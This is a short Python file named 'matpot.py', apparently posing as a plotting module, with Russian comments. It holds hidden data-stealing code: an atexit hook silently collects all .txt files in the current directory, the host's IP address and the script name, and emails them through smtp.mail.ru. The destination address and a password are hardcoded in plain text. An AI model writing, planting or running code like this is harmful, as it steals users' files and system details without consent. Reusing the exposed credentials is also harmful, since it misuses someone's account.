# matpot.py
import os
import sys
import atexit
import socket
from smtplib import SMTP_SSL as SMTP
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

def send_files_via_email(email, password):
    # Получение списка всех txt-файлов в текущей директории
    files = [f for f in os.listdir('.') if os.path.isfile(f) and f.endswith('.txt')]

    # Получение IP-адреса и имени файла
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    filename = os.path.basename(sys.argv[0])

    # Создание сообщения
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = f'From {ip_address} in {filename}'

    # Добавление текста "проверка" в сообщение
    msg.attach(MIMEText('проверка'))

    # Добавление файлов к сообщению
    for file in files:
        part = MIMEBase('text', 'plain') 
        with open(file, 'rb') as f:
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"' % file)
        msg.attach(part)

    # Отправка сообщения через веб-почту (SMTP)
    try:
        connection = SMTP('smtp.mail.ru')
        connection.set_debuglevel(False) 
        connection.login(email, password)
        connection.sendmail(email, email, msg.as_string())
    finally:
        connection.close()

# Регистрация функции, которая будет вызвана при завершении программы
atexit.register(send_files_via_email, 'evgenyzach@mail.ru', '2bb5yB80VDVG48FfeFab')